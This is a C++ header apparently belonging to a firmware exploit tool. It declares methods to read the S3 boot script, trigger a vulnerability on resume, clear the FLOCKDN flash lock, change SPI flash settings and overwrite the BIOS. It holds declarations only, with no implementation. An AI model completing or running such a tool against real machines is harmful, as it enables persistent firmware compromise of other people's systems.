#ifndef __EXPLOIT_MODULE__
#define __EXPLOIT_MODULE__

#include <cstdint>
#include "error.hpp"
#include <string>
#include "s3exploit_ioctl.h"

constexpr std::size_t FLOCKDN = 1U << 15;
constexpr std::size_t WRITE_PROTECTION = 1U << 31;
constexpr std::size_t READ_PROTECTION = 1U << 15;
constexpr std::size_t BIOSWE = 1UL << 0;

class ExploitModule {
    int fd;
    ExploitModule(int );
    ExploitModule(const ExploitModule& ) = delete;
public:
    ExploitModule(ExploitModule&& );
    ~ExploitModule();

    static Result<ExploitModule, int> open();
    
    Result<uint8_t*, int> get_bootscript_addr() const noexcept;
    Result<std::size_t, int> get_bootscript_size() const noexcept;
    Result<std::string, int> get_bootscript() const noexcept;

    int trigger_vuln(std::size_t wakeup_after) const noexcept;
    bool is_vuln() const noexcept;

    Result<spi_flash_info, int> get_flash_info(uint32_t what) const noexcept;
    int set_spi_flash_info(const spi_flash_info& info) const noexcept;
    int reset_flockdn_bit() const noexcept;

    int overwrite_bios(const std::string& data, uint32_t offset) const noexcept;

    int run() noexcept;
};

#endif
